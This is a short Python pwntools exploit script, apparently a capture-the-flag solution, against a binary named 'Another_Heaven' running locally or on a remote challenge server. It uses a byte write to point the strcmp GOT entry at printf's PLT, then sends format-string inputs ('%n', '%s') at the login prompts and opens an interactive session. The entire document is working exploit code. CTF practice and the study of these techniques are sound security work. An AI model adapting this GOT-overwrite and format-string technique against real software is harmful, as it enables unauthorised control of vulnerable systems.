#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Another_Heaven')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 21001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./Another_Heaven', checksec=False)
got_strcmp = elf.got['strcmp']
plt_printf = elf.plt['printf']

# gdb.attach(p, "b *0x400CE8\nc")
p.sendlineafter('There is a back door..."Hacked by Annevi!"\n', str(got_strcmp))
p.send(chr(plt_printf & 0xff))
p.sendlineafter('Account:', '%n')
p.sendlineafter('Password:', '%s')
p.sendlineafter('Forgot your password?(y/n)\n', 'n')
success('got_strcmp  = ' + hex(got_strcmp))
success('plt_printf  = ' + hex(plt_printf))
p.interactive()
